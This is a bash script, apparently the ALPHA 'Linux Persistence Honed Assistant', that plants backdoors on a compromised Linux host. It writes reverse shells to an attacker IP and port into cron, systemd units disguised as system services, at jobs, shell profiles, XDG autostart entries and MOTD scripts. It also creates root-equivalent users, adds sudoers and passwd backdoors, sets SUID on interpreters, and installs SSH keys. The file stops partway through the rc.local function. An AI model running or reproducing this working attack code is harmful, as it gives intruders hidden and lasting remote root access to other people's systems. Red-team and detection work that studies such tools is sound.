#!/bin/bash
RED='\033[0;31m'
NC='\033[0m'

print_banner() {
	echo ""
	echo " ▄▄▄       ██▓     ██▓███   ██░ ██  ▄▄▄       "
	echo "▒████▄    ▓██▒    ▓██░  ██▒▓██░ ██▒▒████▄     "
	echo "▒██  ▀█▄  ▒██░    ▓██░ ██▓▒▒██▀▀██░▒██  ▀█▄   "
	echo "░██▄▄▄▄██ ▒██░    ▒██▄█▓▒ ▒░▓█ ░██ ░██▄▄▄▄██  "
	echo " ▓█   ▓██▒░██████▒▒██▒ ░  ░░▓█▒░██▓ ▓█   ▓██▒ "
	echo " ▒▒   ▓▒█░░ ▒░▓  ░▒▓▒░ ░  ░ ▒ ░░▒░▒ ▒▒   ▓▒█░ "
	echo "  ▒   ▒▒ ░░ ░ ▒  ░░▒ ░      ▒ ░▒░ ░  ▒   ▒▒ ░ "
	echo "  ░   ▒     ░ ░   ░░        ░  ░░ ░  ░   ▒    "
	echo "      ░  ░    ░  ░          ░  ░  ░      ░  ░ "
	echo "                                 "
	echo "Aegrah's Linux Persistence Honed Assistant (ALPHA)"
	echo "Github: https://github.com/Aegrah/ALPHA"
	echo "Twitter: https://twitter.com/RFGroenewoud"
	echo ""
}

check_root() {
	if [[ $EUID -ne 0 ]]; then
		return 1
	else
		return 0
	fi
}

usage_user() {
	echo ""
	echo -e "${RED}[!] Warning: More features are available when running as root.${NC}"
	echo ""
	echo "Low Privileged User Options:"
	echo ""
	echo "  --cron                      Cron job persistence"
	echo "    --default                    Use default cron settings"
	echo "        --ip <ip>                  Specify IP address"
	echo "        --port <port>              Specify port number"
	echo "  --ssh-key                   SSH key persistence"
	echo "      --default                    Use default SSH key settings"
	echo "  --systemd                   Systemd service persistence"
	echo "      --default                    Use default systemd settings"
	echo "          --ip <ip>                  Specify IP address"
	echo "          --port <port>              Specify port number"
	echo "      --custom                     Use custom systemd settings (make sure they are valid!)"
	echo "          --path <path>                Specify custom service path (must end with .service)"
	echo "          --command <command>          Specify custom persistence command (no validation)"
	echo "          --timer                      Create systemd timer (1 minute interval)"
	echo "  --at                         At job persistence"
	echo "      --default                    Use default at settings"
	echo "          --ip <ip>                  Specify IP address"
	echo "          --port <port>              Specify port number"
	echo "          --time <time>              Specify time for at job (e.g., now + 1 minute)"
	echo "      --custom                     Use custom at settings"
	echo "          --command <command>          Specify custom persistence command"
	echo "          --time <time>              Specify time for at job (e.g., now + 1 minute)"
	echo "  --shell-configuration         Shell profile persistence"
	echo "      --default                    Use default profile settings"
	echo "          --ip <ip>                  Specify IP address"
	echo "          --port <port>              Specify port number"
	echo "      --custom                     Use custom profile settings"
	echo "          --file <file>                Specify custom profile file"
	echo "          --command <command>          Specify custom persistence command"
	echo "  --xdg                        XDG autostart persistence"
	echo "      --default                    Use default XDG settings"
	echo "          --ip <ip>                  Specify IP address"
	echo "          --port <port>              Specify port number"
	echo "      --custom                     Use custom XDG settings"
	echo "          --file <file>                Specify custom desktop entry file"
	echo "          --command <command>          Specify custom persistence command"
	echo "  --authorized-keys            Authorized keys management"
	echo "      --default                    Use default authorized keys settings"
	echo "          --key <key>                Specify the public key"
}

usage_root() {
    echo "Root User Options:"
    echo ""
    echo "  --cron                      Cron job persistence"
    echo "      --default                    Use default cron settings"
    echo "          --ip <ip>                  Specify IP address"
    echo "          --port <port>              Specify port number"
    echo "      --custom                     Use custom cron settings"
    echo "          --command <command>         Specify custom persistence command (no validation)"
    echo "          --crond                     Persist in cron.d directory"
    echo "          --daily                     Persist in cron.daily directory"
    echo "          --hourly                    Persist in cron.hourly directory"
    echo "          --monthly                   Persist in cron.monthly directory"
    echo "          --weekly                    Persist in cron.weekly directory"
    echo "          --name <name>               Specify custom cron job name"
    echo "          --crontab                   Persist in crontab file"
    echo "  --ssh-key                   SSH key persistence"
    echo "      --default                    Use default SSH key settings"
    echo "      --custom                     Use custom SSH key settings"
    echo "          --user <user>               Specify user for custom SSH key"
    echo "  --systemd                   Systemd service persistence"
    echo "      --default                    Use default systemd settings"
    echo "          --ip <ip>                  Specify IP address"
    echo "          --port <port>              Specify port number"
    echo "      --custom                     Use custom systemd settings (make sure they are valid!)"
    echo "          --path <path>                Specify custom service path (must end with .service)"
    echo "          --command <command>          Specify custom persistence command (no validation)"
    echo "          --timer                      Create systemd timer (1 minute interval)"
    echo "  --at                         At job persistence"
    echo "      --default                    Use default at settings"
    echo "          --ip <ip>                  Specify IP address"
    echo "          --port <port>              Specify port number"
    echo "          --time <time>              Specify time for at job (e.g., now + 1 minute)"
    echo "      --custom                     Use custom at settings"
    echo "          --command <command>          Specify custom persistence command"
    echo "          --time <time>              Specify time for at job (e.g., now + 1 minute)"
    echo "  --shell-configuration         Shell profile persistence"
    echo "      --default                    Use default profile settings"
    echo "          --ip <ip>                  Specify IP address"
    echo "          --port <port>              Specify port number"
    echo "      --custom                     Use custom profile settings"
    echo "          --file <file>                Specify custom profile file"
    echo "          --command <command>          Specify custom persistence command"
    echo "  --xdg                        XDG autostart persistence"
    echo "      --default                    Use default XDG settings"
    echo "          --ip <ip>                  Specify IP address"
    echo "          --port <port>              Specify port number"
    echo "      --custom                     Use custom XDG settings"
    echo "          --file <file>                Specify custom desktop entry file"
    echo "          --command <command>          Specify custom persistence command"
    echo "  --authorized-keys            Authorized keys management"
    echo "      --default                    Use default authorized keys settings"
    echo "          --key <key>                Specify the public key"
    echo "      --custom                     Use custom authorized keys settings"
    echo "          --key <key>                Specify the public key"
    echo "          --path <path>              Specify custom authorized keys file path"
    echo "  --create-user                Create a new user"
    echo "      --default                    Use default user creation settings"
    echo "          --username <username>      Specify the username"
    echo "          --password <password>      Specify the password"
    echo "  --backdoor-user              Set up a backdoor user"
    echo "      --default                    Use default backdoor user settings"
    echo "          --username <username>      Specify the username"
    echo "  --password-change            Change user password"
    echo "      --default                    Use default password change settings"
    echo "          --username <username>      Specify the username"
    echo "          --password <password>      Specify the password"
    echo "  --passwd-user                Add user to /etc/passwd with specified settings"
    echo "      --default                    Use default passwd settings"
    echo "          --username <username>      Specify the username"
    echo "          --password <password>      Specify the password"
    echo "      --custom                     Use custom passwd string"
    echo "          --passwd-string <string>   Specify the passwd string"
    echo "  --sudoers-backdoor           Set up sudoers backdoor"
    echo "      --default                    Use default sudoers backdoor settings"
    echo "          --username <username>      Specify the username"
    echo "  --suid-backdoor              Set up SUID backdoor"
    echo "      --default                    Use default SUID backdoor settings"
    echo "      --custom                     Use custom SUID backdoor settings"
    echo "          --binary <binary>          Specify the binary"
    echo "  --cap-backdoor               Set up capabilities backdoor"
    echo "      --default                    Use default capabilities settings"
    echo "      --custom                     Use custom capabilities settings"
    echo "          --capability <capability>  Specify the capability"
    echo "          --binary <binary>          Specify the binary"
    echo "  --motd-backdoor              Set up MOTD backdoor"
    echo "      --default                    Use default MOTD backdoor settings"
    echo "          --ip <ip>                  Specify IP address"
    echo "          --port <port>              Specify port number"
    echo "      --custom                     Use custom MOTD backdoor settings"
    echo "          --command <command>          Specify custom persistence command"
    echo "          --path <path>                Specify custom path in /etc/update-motd.d/"
    echo "  --rc-local-backdoor          Set up rc.local backdoor"
    echo "      --default                    Use default rc.local backdoor settings"
    echo "          --ip <ip>                  Specify IP address"
    echo "          --port <port>              Specify port number"
    echo "      --custom                     Use custom rc.local backdoor settings"
    echo "          --command <command>          Specify custom persistence command"
    echo "  --initd-backdoor             Set up init.d backdoor"
    echo "      --default                    Use default init.d backdoor settings"
    echo "          --ip <ip>                  Specify IP address"
    echo "          --port <port>              Specify port number"
    echo "      --custom                     Use custom init.d backdoor settings"
    echo "          --command <command>          Specify custom persistence command"
    echo "          --path <path>                Specify custom path in /etc/init.d/"
    echo "  --apt-persistence            Set up APT persistence"
    echo "      --default                    Use default APT persistence settings"
    echo "          --ip <ip>                  Specify IP address"
    echo "          --port <port>              Specify port number"
    echo "      --custom                     Use custom APT persistence settings"
    echo "          --command <command>          Specify custom persistence command"
    echo "          --path <path>                Specify custom path in /etc/apt/apt.conf.d/"
}

setup_systemd() {
	local service_path=""
	local timer_path=""
	local timer=0
	local command=""
	local custom=0
	local default=0
	local ip=""
	local port=""

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--path )
				shift
				service_path=$1
				if [[ ! $service_path == *.service ]]; then
					echo "Error: --path must end with .service"
					exit 1
				fi
				;;
			--command )
				shift
				command=$1
				;;
			--timer )
				timer=1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			* )
				echo "Invalid option for --systemd: $1"
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		exit 1
	elif [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			exit 1
		fi

		if check_root; then
			service_path="/usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.service"
			timer_path="/usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.timer"
		else
			local current_user=$(whoami)
			service_path="/home/$current_user/.config/systemd/user/dbus-org.freedesktop.resolved.service"
			timer_path="/home/$current_user/.config/systemd/user/dbus-org.freedesktop.resolved.timer"
		fi

		mkdir -p $(dirname "$service_path")
		cat <<-EOF > $service_path
		[Unit]
		Description=Network Name Resolution

		[Service]
		ExecStart=/usr/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'
		Restart=always
		RestartSec=60

		[Install]
		WantedBy=default.target
		EOF

		if check_root; then
		if [ -f /usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.service ]; then
			echo "Service file created successfully!"
		else
			echo "Failed to create service file!"
			exit 1
		fi

		else
			if [ -f /home/$current_user/.config/systemd/user/dbus-org.freedesktop.resolved.service ]; then
				echo "Service file created successfully!"
			else
				echo "Failed to create service file!"
				exit 1
			fi
		fi

		cat <<-EOF > $timer_path
		[Unit]
		Description=Network Name Resolution Timer

		[Timer]
		OnCalendar=*:*:00
		Persistent=true

		[Install]
		WantedBy=timers.target
		EOF

				if check_root; then
			if [ -f /usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.timer ]; then
				echo "Timer file created successfully!"
			else
				echo "Failed to create timer file!"
				exit 1
			fi

		else
			if [ -f /home/$current_user/.config/systemd/user/dbus-org.freedesktop.resolved.timer ]; then
				echo "Timer file created successfully!"
			else
				echo "Failed to create timer file!"
				exit 1
			fi
		fi

		if check_root; then
			systemctl daemon-reload
			systemctl enable $(basename $timer_path)
			systemctl start $(basename $timer_path)
		else
			systemctl --user daemon-reload
			systemctl --user enable $(basename $timer_path)
			systemctl --user start $(basename $timer_path)
		fi

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $service_path || -z $command ]]; then
			echo "Error: --path and --command must be specified when using --custom."
			exit 1
		fi

		mkdir -p $(dirname "$service_path")
		cat <<-EOF > $service_path
		[Unit]
		Description=Custom Service

		[Service]
		ExecStart=$command
		Restart=always
		RestartSec=60

		[Install]
		WantedBy=default.target
		EOF

		if [ -f $service_path ]; then
			echo "Service file created successfully!"
		else
			echo "Failed to create service file!"
			exit 1
		fi

		if check_root; then
			systemctl daemon-reload
			systemctl enable $(basename $service_path)
			systemctl start $(basename $service_path)
		else
			systemctl --user daemon-reload
			systemctl --user enable $(basename $service_path)
			systemctl --user start $(basename $service_path)
		fi

		if [[ $timer -eq 1 ]]; then
			timer_path="${service_path%.service}.timer"
			mkdir -p $(dirname "$timer_path")
			cat <<-EOF > $timer_path
			[Unit]
			Description=Custom Timer

			[Timer]
			OnCalendar=*:*:00
			Persistent=true

			[Install]
			WantedBy=timers.target
			EOF

			if [ -f $timer_path ]; then
				echo "Timer file created successfully!"
			else
				echo "Failed to create timer file!"
				exit 1
			fi

			if check_root; then
				systemctl daemon-reload
				systemctl enable $(basename $timer_path)
				systemctl start $(basename $timer_path)
			else
				systemctl --user daemon-reload
				systemctl --user enable $(basename $timer_path)
				systemctl --user start $(basename $timer_path)
			fi
		fi
	else
		echo "Error: Either --default or --custom must be specified for --systemd."
		exit 1
	fi

	echo "[+] Persistence established."
}

setup_cron() {
	local cron_path=""
	local command=""
	local custom=0
	local default=0
	local ip=""
	local port=""
	local name=""
	local option=""

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--command )
				shift
				command=$1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--crond|--daily|--hourly|--monthly|--weekly )
				if check_root; then
					option=$1
					case $option in
						--crond )
							cron_path="/etc/cron.d"
							;;
						--daily )
							cron_path="/etc/cron.daily"
							;;
						--hourly )
							cron_path="/etc/cron.hourly"
							;;
						--monthly )
							cron_path="/etc/cron.monthly"
							;;
						--weekly )
							cron_path="/etc/cron.weekly"
							;;
					esac
				else
					echo "Error: Only root users can use the $option option."
					exit 1
				fi
				;;
			--crontab )
				if check_root; then
					cron_path="/etc/crontab"
				else
					echo "Error: Only root users can use the --crontab option."
					exit 1
				fi
				;;
			--name )
				shift
				name=$1
				;;
			* )
				echo "Invalid option: $1"
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --default requires --ip and --port."
			exit 1
		fi
		if check_root; then
			cron_path="/etc/cron.d/freedesktop_timesync1"
			command="* * * * * root /bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'"
			echo "$command" > "$cron_path"

		else
			command="* * * * * /bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'"
			(crontab -l 2>/dev/null; echo "$command") | crontab -
		fi
	elif [[ $custom -eq 1 ]]; then
		if [[ -z $command ]]; then
			echo "Error: --custom requires --command."
			exit 1
		fi
		if [[ $cron_path != "/etc/crontab" && -z $name ]]; then
			echo "Error: --custom requires --name for all options other than --crontab."
			exit 1
		fi
		if [[ $cron_path != "/etc/crontab" ]]; then
			cron_path="$cron_path/$name"
		fi
		echo "$command" > "$cron_path"
	else
		echo "Error: Either --default or --custom must be specified for --cron."
		exit 1
	fi

	echo "[+] Cron job persistence established."
}

setup_at() {
	local command=""
	local custom=0
	local default=0
	local ip=""
	local port=""
	local time=""

	if ! command -v at &> /dev/null; then
		echo "Error: 'at' binary is not present. Please install 'at' to use this mechanism."
		exit 1
	fi

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--command )
				shift
				command=$1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--time )
				shift
				time=$1
				;;
			* )
				echo "Invalid option for --at: $1"
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		exit 1
	elif [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port || -z $time ]]; then
			echo "Error: --ip, --port, and --time must be specified when using --default."
			exit 1
		fi
		echo "/bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'" | at $time
	elif [[ $custom -eq 1 ]]; then
		if [[ -z $command || -z $time ]]; then
			echo "Error: --command and --time must be specified when using --custom."
			exit 1
		fi
		echo "$command" | at $time
	else
		echo "Error: Either --default or --custom must be specified for --at."
		exit 1
	fi

	echo "[+] At job persistence established."
}

setup_shell_profile() {
	local profile_path=""
	local command=""
	local custom=0
	local default=0
	local ip=""
	local port=""

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--file )
				shift
				profile_path=$1
				;;
			--command )
				shift
				command=$1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			* )
				echo "Invalid option for --profile: $1"
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		exit 1
	elif [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			exit 1
		fi

		if check_root; then
			profile_path="/etc/profile"
		else
			local current_user=$(whoami)
			profile_path="/home/$current_user/.bash_profile"
		fi

		echo "(nohup bash -i > /dev/tcp/$ip/$port 0<&1 2>&1 &)" >> $profile_path
	elif [[ $custom -eq 1 ]]; then
		if [[ -z $profile_path || -z $command ]]; then
			echo "Error: --file and --command must be specified when using --custom."
			exit 1
		fi

		echo "$command" >> $profile_path
	else
		echo "Error: Either --default or --custom must be specified for --profile."
		exit 1
	fi

	echo "[+] Shell profile persistence established."
}

setup_xdg() {
	if [[ ! -d "/etc/xdg" ]]; then
		echo "Warning: /etc/xdg directory does not exist. XDG might not be present on this system."
	fi

	local profile_path=""
	local command=""
	local custom=0
	local default=0
	local ip=""
	local port=""

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--file )
				shift
				profile_path=$1
				;;
			--command )
				shift
				command=$1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			* )
				echo "Invalid option for --xdg: $1"
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		exit 1
	elif [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			exit 1
		fi

		if check_root; then
			profile_path="/etc/xdg/autostart/pkc12-register.desktop"
			command="/etc/xdg/pkc12-register"
			mkdir -p /etc/xdg/autostart
			echo -e "[Desktop Entry]\nType=Application\nExec=$command\nName=pkc12-register" > $profile_path
			echo -e "#!/bin/bash\n/bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'" > $command
			chmod +x $command
		else
			local current_user=$(whoami)
			profile_path="/home/$current_user/.config/autostart/user-dirs.desktop"
			command="/home/$current_user/.config/autostart/.user-dirs"
			mkdir -p /home/$current_user/.config/autostart
			echo -e "[Desktop Entry]\nType=Application\nExec=$command\nName=user-dirs" > $profile_path
			echo -e "#!/bin/bash\n/bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'" > $command
			chmod +x $command
		fi

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $profile_path || -z $command ]]; then
			echo "Error: --file and --command must be specified when using --custom."
			exit 1
		fi

		if check_root; then
			local exec_path=${profile_path%.desktop}
			echo -e "[Desktop Entry]\nType=Application\nExec=$exec_path\nName=$(basename $exec_path)" > $profile_path
			echo -e "#!/bin/bash\n$command" > $exec_path
			chmod +x $exec_path
		else
			local current_user=$(whoami)
			profile_path="/home/$current_user/.config/autostart/$(basename $profile_path)"
			local exec_path="/home/$current_user/.config/autostart/$(basename ${profile_path%.desktop})"
			mkdir -p /home/$current_user/.config/autostart
			echo -e "[Desktop Entry]\nType=Application\nExec=$exec_path\nName=$(basename $exec_path)" > $profile_path
			echo -e "#!/bin/bash\n$command" > $exec_path
			chmod +x $exec_path
		fi
	else
		echo "Error: Either --default or --custom must be specified for --xdg."
		exit 1
	fi

	echo "[+] XDG persistence established."
}

setup_ssh_key() {
	if ! command -v ssh-keygen &> /dev/null; then
		echo "Error: 'ssh-keygen' is not installed. Please install it to use this feature."
		exit 1
	fi

	local default=0
	local custom=0
	local target_user=""
	local ssh_dir=""
	local ssh_key_path=""

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--user )
				shift
				target_user=$1
				;;
			* )
				echo "Invalid option for --ssh-key: $1"
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		exit 1
	elif [[ $default -eq 1 ]]; then
		if check_root; then
			ssh_dir="/root/.ssh"
			ssh_key_path="$ssh_dir/id_rsa1822"
		else
			local current_user=$(whoami)
			ssh_dir="/home/$current_user/.ssh"
			ssh_key_path="$ssh_dir/id_rsa1822"
		fi

		mkdir -p $ssh_dir
		ssh-keygen -t rsa -b 2048 -f $ssh_key_path -N "" -q
		cat $ssh_key_path.pub >> $ssh_dir/authorized_keys
		echo "SSH key generated:"
		echo "Private key: $ssh_key_path"
		echo "Public key: ${ssh_key_path}.pub"

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $target_user ]]; then
			echo "Error: --user must be specified when using --custom."
			exit 1
		fi

		if id -u $target_user &>/dev/null; then
			local user_home=$(eval echo ~$target_user)
			ssh_dir="$user_home/.ssh"
			ssh_key_path="$ssh_dir/id_rsa1822"

			mkdir -p $ssh_dir
			chown $target_user:$target_user $ssh_dir
			sudo -u $target_user ssh-keygen -t rsa -b 2048 -f $ssh_key_path -N "" -q
			cat $ssh_key_path.pub >> $ssh_dir/authorized_keys
			chown $target_user:$target_user $ssh_key_path $ssh_key_path.pub $ssh_dir/authorized_keys
			echo "SSH key generated for $target_user:"
			echo "Private key: $ssh_key_path"
			echo "Public key: ${ssh_key_path}.pub"
		else
			echo "Error: User $target_user does not exist."
			exit 1
		fi
	else
		echo "Error: Either --default or --custom must be specified for --ssh-key."
		exit 1
	fi

	echo "[+] SSH key persistence established."
}

setup_authorized_keys() {
	local key=""
	local path=""
	local default=0
	local custom=0

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--key )
				shift
				key=$1
				;;
			--path )
				shift
				path=$1
				;;
			* )
				echo "Invalid option for --authorized-keys: $1"
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		exit 1
	elif [[ -z $key ]]; then
		echo "Error: --key must be specified."
		exit 1
	fi

	if check_root; then
		if [[ $default -eq 1 ]]; then
			path="/root/.ssh/authorized_keys"
		elif [[ $custom -eq 1 && -n $path ]]; then
			mkdir -p $(dirname $path)
		else
			echo "Error: --path must be specified with --custom for root."
			exit 1
		fi
	else
		if [[ $default -eq 1 ]]; then
			local current_user=$(whoami)
			path="/home/$current_user/.ssh/authorized_keys"
		else
			echo "Error: Only root can use --custom for --authorized-keys."
			exit 1
		fi
	fi

	mkdir -p $(dirname $path)
	echo $key >> $path
	chmod 600 $path

	echo "[+] Persistence added to $path"
}

setup_new_user() {
	local default=0
	local username=""
	local password=""

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--username )
				shift
				username=$1
				;;
			--password )
				shift
				password=$1
				;;
			* )
				echo "Invalid option for --create-user: $1"
				exit 1
		esac
		shift
	done

	if [[ $default -eq 0 ]]; then
		echo "Error: --default must be specified."
		exit 1
	fi

	if [[ -z $username || -z $password ]]; then
		echo "Error: --username and --password must be specified."
		exit 1
	fi

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	useradd -M $username
	echo "$username:$password" | chpasswd

	echo "[+] Persistence through the new $username user established!"
}

setup_backdoor_user() {
	local default=0
	local username=""

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--username )
				shift
				username=$1
				;;
			* )
				echo "Invalid option for --backdoor-user: $1"
				exit 1
		esac
		shift
	done

	if [[ $default -eq 0 ]]; then
		echo "Error: --default must be specified."
		exit 1
	fi

	if [[ -z $username ]]; then
		echo "Error: --username must be specified."
		exit 1
	fi

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usermod -u 0 -o $username

	if [[ $? -eq 0 ]]; then
		echo "[+] User $username has been modified to have UID 0 (root privileges)."
	else
		echo "[-] Failed to modify user $username."
		exit 1
	fi
}

setup_password_change() {
	local default=0
	local username=""
	local password=""

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--username )
				shift
				username=$1
				;;
			--password )
				shift
				password=$1
				;;
			* )
				echo "Invalid option for --password-change: $1"
				exit 1
		esac
		shift
	done

	if [[ $default -eq 0 ]]; then
		echo "Error: --default must be specified."
		exit 1
	fi

	if [[ -z $username || -z $password ]]; then
		echo "Error: --username and --password must be specified."
		exit 1
	fi

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	echo "$username:$password" | chpasswd

	if [[ $? -eq 0 ]]; then
		echo "[+] Password for user $username has been changed."
	else
		echo "[-] Failed to change password for user $username."
		exit 1
	fi
}

setup_passwd_user() {
	local default=0
	local custom=0
	local username=""
	local password=""
	local passwd_string=""

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--username )
				shift
				username=$1
				;;
			--password )
				shift
				password=$1
				;;
			--passwd-string )
				shift
				passwd_string=$1
				;;
			* )
				echo "Invalid option for --passwd-user: $1"
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		if [[ -z $username || -z $password ]]; then
			echo "Error: --username and --password must be specified with --default."
			exit 1
		fi

		if ! command -v openssl &> /dev/null; then
			echo "Error: openssl is not installed on this system. Use --custom with --passwd-string instead."
			exit 1
		fi

		openssl_password=$(openssl passwd "$password")
		if [[ $? -eq 0 ]]; then
			echo "$username:$openssl_password:0:0:root:/root:/bin/bash" >> /etc/passwd
			echo "[+] User $username added to /etc/passwd with root privileges."
		else
			echo "[-] Failed to generate password hash with openssl."
			exit 1
		fi

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $passwd_string ]]; then
			echo "Error: --passwd-string must be specified with --custom."
			exit 1
		fi

		echo "$passwd_string" >> /etc/passwd
		echo "[+] Custom passwd string added to /etc/passwd."
	else
		echo "Error: Either --default or --custom must be specified for --passwd-user."
		exit 1
	fi
}

setup_sudoers_backdoor() {
	local default=0
	local username=""

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--username )
				shift
				username=$1
				;;
			* )
				echo "Invalid option for --sudoers-backdoor: $1"
				exit 1
		esac
		shift
	done

	if [[ $default -eq 0 ]]; then
		echo "Error: --default must be specified."
		exit 1
	fi

	if [[ -z $username ]]; then
		echo "Error: --username must be specified."
		exit 1
	fi

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	echo "$username ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/$username

	if [[ $? -eq 0 ]]; then
		echo "[+] User $username can now run all commands without a sudo password."
	else
		echo "[-] Failed to create sudoers backdoor for user $username."
		exit 1
	fi
}

setup_suid_backdoor() {
	local default=0
	local custom=0
	local binary=""

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--binary )
				shift
				binary=$1
				;;
			* )
				echo "Invalid option for --suid-backdoor: $1"
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		exit 1
	fi

	if [[ $default -eq 0 && $custom -eq 0 ]]; then
		echo "Error: Either --default or --custom must be specified."
		exit 1
	fi

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		local binaries=("find" "dash" "python" "python3")

		for bin in "${binaries[@]}"; do
			if command -v $bin &> /dev/null; then
				local path=$(command -v $bin)
				chmod u+s $path
				if [[ $? -eq 0 ]]; then
					echo "[+] SUID privilege granted to $path"
				else
					echo "[-] Failed to grant SUID privilege to $path"
				fi
			else
				echo "[-] $bin is not present on the system."
			fi
		done
	elif [[ $custom -eq 1 ]]; then
		if [[ -z $binary ]]; then
			echo "Error: --binary must be specified with --custom."
			exit 1
		fi

		if command -v $binary &> /dev/null; then
			local path=$(command -v $binary)
			chmod u+s $path
			if [[ $? -eq 0 ]]; then
				echo "[+] SUID privilege granted to $path"
			else
				echo "[-] Failed to grant SUID privilege to $path"
			fi
		else
			echo "[-] $binary is not present on the system."
		fi
	fi
}

setup_motd_backdoor() {
	local default=0
	local custom=0
	local ip=""
	local port=""
	local command=""
	local path=""

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--command )
				shift
				command=$1
				;;
			--path )
				shift
				path=$1
				;;
			* )
				echo "Invalid option for --motd-backdoor: $1"
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		exit 1
	fi

	if [[ $default -eq 0 && $custom -eq 0 ]]; then
		echo "Error: Either --default or --custom must be specified."
		exit 1
	fi

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			exit 1
		fi

		path="/etc/update-motd.d/137-python-upgrades"
		echo -e "#!/bin/sh\nnohup setsid bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'" > $path
		chmod +x $path
		echo "[+] MOTD backdoor established in $path"

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $command || -z $path ]]; then
			echo "Error: --command and --path must be specified when using --custom."
			exit 1
		fi

		if [[ ! -f $path ]]; then
			echo -e "#!/bin/sh\n$command" > $path
			chmod +x $path
		else
			echo "$command" >> $path
		fi
		echo "[+] MOTD backdoor established in $path"
	fi
}

setup_rc_local_backdoor() {
	local default=0
	local custom=0
	local ip=""
	local port=""
	local command=""
	local rc_local_path="/etc/rc.local"

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--command )
				shift
				command=$1
				;;
			* )
				echo "Invalid option for --rc-local-backdoor: $1"
				exit 1
		esac
		shift
	done

